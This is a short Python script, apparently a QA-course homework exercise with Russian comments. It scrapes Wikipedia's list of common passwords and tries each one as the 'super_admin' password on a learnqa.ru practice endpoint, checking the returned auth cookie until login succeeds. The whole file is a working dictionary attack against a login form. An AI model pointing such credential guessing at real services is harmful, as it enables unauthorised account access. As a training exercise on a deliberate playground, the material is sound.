import requests
from bs4 import BeautifulSoup


def get_passwords_list(name_of_list):
    url = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords"
    request_header = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                                    "Chrome/128.0.0.0 "
                                    "Safari/537.36"}
    response = requests.get(url, headers=request_header)
    soup = BeautifulSoup(response.text, 'html.parser')
    table = soup.select_one('table:-soup-contains("'+name_of_list+'")')
    elements = table.findAll('td')
    passwords = []
    for element in elements:
        if len(element.text) > 3:  # Отсекаем первый столбик с порядковым номером
            passwords.append(element.text[:-1].replace("[a]", ""))
    return list(set(passwords))


def get_secret_password_homework(login, pwd):
    url = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
    response = requests.post(url, data={"login": login, "password": pwd})
    if 'auth_cookie' in response.cookies:
        return response.cookies['auth_cookie']
    else:
        return None


def check_auth_cookie(cookie):
    url = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'
    session = requests.Session()
    response = session.post(url, cookies={"auth_cookie": cookie})
    return response.text


if __name__ == "__main__":
    passwords_list = get_passwords_list("Top 25 most common passwords by year according to SplashData")
    for num, password in enumerate(passwords_list, start=1):
        auth_cookie = get_secret_password_homework("super_admin", password)
        check_result = check_auth_cookie(auth_cookie)
        # print(f"Попытка {num}, пароль '{password}', cookie {auth_cookie}, ответ {check_result}")
        if check_result != "You are NOT authorized":
            print(f"Найден пароль '{password}', полученная фраза {check_result}")
